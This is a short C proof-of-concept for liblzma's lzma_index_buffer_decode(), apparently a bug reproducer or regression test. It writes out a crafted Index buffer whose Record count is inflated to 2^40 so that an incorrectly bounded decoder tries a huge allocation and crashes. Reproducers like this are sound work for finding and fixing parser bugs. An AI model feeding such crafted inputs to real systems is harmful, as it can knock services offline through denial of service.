// SPDX-License-Identifier: 0BSD
//
// PoC for lzma_index_buffer_decode():
//
// The caller has already consumed the beginning of the buffer and thus
// passes *in_pos > 0. The Number of Records field in the Index claims a
// huge value that a correctly-bounded decoder must reject as corrupt
// (an Index this small cannot hold that many Records). A decoder whose
// input size limit is derived incorrectly can accept the value and then
// try to allocate memory for the claimed Records while decoding the
// first Record, which aborts under AddressSanitizer.

#include "lzma.h"

#include <stdint.h>
#include <stdio.h>
#include <string.h>


int
main(void)
{
	// A 32-byte buffer. The first 20 bytes are data that the caller
	// has already processed; Index decoding starts at byte 20.
	uint8_t buf[32];
	memset(buf, 0xAB, sizeof(buf));

	buf[20] = 0x00;   // Index Indicator
	buf[21] = 0x80;   // Number of Records = 2^40
	buf[22] = 0x80;   // (multibyte integer, 6 bytes)
	buf[23] = 0x80;
	buf[24] = 0x80;
	buf[25] = 0x80;
	buf[26] = 0x20;
	buf[27] = 0x0C;   // Record: Unpadded Size = 12
	buf[28] = 0x00;   // Record: Uncompressed Size = 0

	lzma_index *i = NULL;
	uint64_t memlimit = UINT64_MAX;
	size_t in_pos = 20;

	const lzma_ret ret = lzma_index_buffer_decode(&i, &memlimit, NULL,
			buf, &in_pos, sizeof(buf));

	printf("lzma_index_buffer_decode() returned %d\n", (int)ret);
	printf("in_pos = %zu\n", in_pos);

	lzma_index_end(i, NULL);
	return 0;
}
